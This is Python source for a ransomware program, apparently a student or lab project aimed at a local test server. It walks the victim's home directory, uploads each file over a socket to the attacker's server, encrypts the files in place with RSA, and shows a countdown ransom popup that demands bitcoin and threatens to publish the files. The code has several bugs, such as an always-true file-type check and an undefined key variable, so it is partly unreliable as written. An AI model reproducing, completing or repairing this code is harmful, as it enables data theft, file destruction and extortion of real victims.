import os
from os.path import expanduser
from cryptography.fernet import Fernet
import subprocess
import time
import signal
import base64
import logging
import socket
import math
import rsa
import threading


class Ransomware: 
    SERVER_IP = "192.168.56.110"
    ENCODING = "utf-8"
    MAX_SIZE = 4096

    def __init__(self, host1, host2, number, directory):
        # Construct hostname of the remote server from the first two
        # arguments.
        self._host = self.SERVER_IP
        # Calculate the port number from the last argument.
        self._port = self.decode_port(number)
        # Initialize socket for the connection.
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Initialize the root directory on the victim's machine
        self._directory = directory 

    @property
    def host(self):
        """ Server that sends us the malicious code. """
        return self._host

    @host.setter
    def host(self, new_host):
        self._host = new_host

    def decode_hostname(self, str1, str2):
        """ Returns hostname of the remote server. """
        return str2[::-1] + str1[::-1]

    @property
    def port(self):
        """ Port, on which the server runs (`int`). """
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port

    def decode_port(self, port):
        """Returns target port of the remote server. """
        return int(math.sqrt(port))

    @property
    def socket(self):
        """ Client socket. """
        return self._socket





    #TODO Rafi/Yusef:
    def send_file_to_server(self, file_path, filename):
        print(filename)
        
        if ".pdf" or ".jar" in filename:
            return
            
        """ Opening and reading the file data. """
        file = open(file_path, "r", encoding = "ISO-8859-1")

        """ Sending the filename to the server. """
        self._socket.send(base64.b64encode(filename.encode(Ransomware.ENCODING)))
        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
        print(f"[SERVER]: {msg}")

        while True:
            data = file.read(1024)
            print(data)
            if not data:
                break
            """ Sending the file data to the server. """
            self._socket.sendall(base64.b64encode(data.encode(Ransomware.ENCODING)))
            msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
            print(f"[SERVER]: {msg}")

        """ Closing the file. """
        file.close()
        
        self._socket.send(base64.b64encode("FILEDONE\n".encode(Ransomware.ENCODING)))
        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
        print(f"[SERVER]: {msg}")



    #TODO Subin:
    def check_if_user_has_paid(self):
        return False



    # Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
    def list_safe_directories(self, directory):

        result = []
        excluded_dirs = set([".", "..", ".Trash-1000", ".config", ".local", ".cache"])

        # Go through all of the directories and exlcude the ones in the excluded_dirs set
        for root, dirs, _ in os.walk(directory):
            dirs[:] = [d for d in dirs if not d.startswith(".") and d not in excluded_dirs]

            result.append(root)
            for directory in dirs:
                result.append(os.path.join(root, directory))

        return result  # Return the list of directories



    # Method that retrieves all of the files in a directory and purposely does not include the ransomeware
    def get_files_in_dir(self, directory):
        # change to home directory so that the paths are correct relative paths.
        os.chdir(directory)

        files = []
        for file in os.listdir(directory):
            # We do not want to encrypt our own ransomware
            if file == "mal.py" or file == "key.key":
                continue
            if os.path.isfile(file):
                files.append(file)

        return files
    


    def establish_connection(self):
        """ Create a connection to the server. """
        try:
            print(self._host)
            self.socket.connect((self._host, self._port))
        except socket.error:
            logging.debug('Dropper could not connect to the server.')
            return



    # Method for encrypting a single file
    def encrypt_file(self, file, key):
        print("started")
        with open(file, "rb") as the_file:
            contents = the_file.read()

        encrypted_contents = rsa.encrypt(contents, key)
        with open(file, "wb") as the_file:
            the_file.write(encrypted_contents)
        print("terminated")




    # Encrypt all the safe to encrypt files on a victims pc
    def encrypt_and_send_all_files(self, directory):

        number_of_files = 0
        size_of_files = 0

        dir_list = self.list_safe_directories(directory)
        for dir in dir_list:
            for file in self.get_files_in_dir(dir):
                file_path = os.path.join(dir, file)
                file_size = os.path.getsize(file_path)
                size_of_files += file_size
                number_of_files += 1

                # Send file to server
                self.send_file_to_server(file_path, file)
                
                # Encrypt file
                self.encrypt_file(file_path, key)
        
        self._socket.sendall(base64.b64encode("DONE.".encode(Ransomware.ENCODING)))

        print("Number of files encrypted: " + str(number_of_files))
        print("Total size of files: " + str(size_of_files))




    def decrypt_file(self, file_path, key):
        with open(file_path, "rb") as file:
            encrypted_contents = file.read()

        decrypted_contents = rsa.decrypt(encrypted_contents, key)
        with open(file_path, "wb") as the_file:
            the_file.write(decrypted_contents)

    def decrypt_all_files(self, directory, key):
        dir_list = self.list_safe_directories(directory)
        for dir in dir_list:
            for file in self.get_files_in_dir(dir):
                file_path = os.path.join(dir, file)
                self.decrypt_file(file_path, key)

    def execute_attack(self):
        
        self.establish_connection()
        
        """ Receiving the public key. """
        #filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
        #print(f"[RECV] Receiving the public key.")
        #file = open(filename, "w")
        #self._socket.sendall("Public key filename received.".encode("utf-8"))
 
        """ Receiving the public key from the server. """
        #data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
        #file.write(data)
          
        #print(f"[RECV] Receiving the public key data.")
        #file.write(data)
        #self._socket.sendall("File data received".encode("utf-8"))
 
        """ Closing the file. """
        #file.close()

        #Read the public key from the server
        with open("public_key.pem", "rb") as key_content:
            key = rsa.PublicKey.load_pkcs1(key_content.read())

        #Encrypt all files
        t1 = threading.Thread(target=self.encrypt_and_send_all_files(self._directory))
        t1.start()
        print("thread started")


        #NOTE: Ideally this time would be stored on the server so that if they close their computer and open it 
        # again its still the same. Alternatively mayb we tell them not to close their computer?

        start_time = time.time()
        remaining_time = 86400

        while remaining_time > 0:
            # Format the remaining time as hours, minutes and seconds
            hours = int(remaining_time // 3600)
            minutes = int((remaining_time%3600) // 60)
            seconds = int(remaining_time % 60)

            # Text to be displayed on the pop up
            text = f"HAHAHAHA, all your files are encrypted and stored on our server!\n If you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\n If you do not pay us, the files will be published to the internet for all to see.\n DO NOT TURN OFF YOUR COMPUTER - WE WILL CONSDIER THIS AS NON PAYMENT \nTransfer: xxx btc to wallet_id"

            # Show the dialog with the remaining time, keep refreshing the window.
            popup = subprocess.Popen(["zenity", "--warning", "--text", text,"--width", "400", "--height", "200" ])

            # Update the remaining time
            elapsed_time = time.time() - start_time
            remaining_time = remaining_time - elapsed_time
            time.sleep(1)
            popup.send_signal(signal.SIGTERM)

            if (self.check_if_user_has_paid()):
                break


        #User has paid before the time ran out
        if (ransomware.check_if_user_has_paid()):
            # Waits until all the files has been uploaded before processing the payment
            t1.join()
            popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
        
            """ Receiving the private key. """
            filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
            print(f"[RECV] Receiving the private key.")
            key = open(filename, "w")
            self._socket.sendall("Private key filename received.".encode("utf-8"))
 
            """ Receiving the private key from the server. """
            data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
            key.write(data)
          
            print(f"[RECV] Receiving the private key data.")
            key.write(data)
            self._socket.sendall("File data received".encode("utf-8"))
        
            """ Closing the file. """
            key.close()

            #Read the private key from the server
            #I am not sure where to put this above, so I will leave it here for now
            with open("private_key.pem", "rb") as key_content:
                key = rsa.PrivateKey.load_pkcs1(key_content.read())
        
            # self.decrypt_all_files(home, key)
        
            #TODO: Implement code to delete all the files that are stored on the server

        else: # Timer has run out
            #TODO: Implement file deletion and internet publication code.
            print("timer ran out ")



#Main function/ control flow
if __name__ == '__main__':

    # Home directory
    home = expanduser("~")

    logging.basicConfig(level=logging.DEBUG)

    # Initialize Ransomware
    ransomware = Ransomware('tsoh', 'lacol', 729000000, home)
    
    # Start the attack
    ransomware.execute_attack()

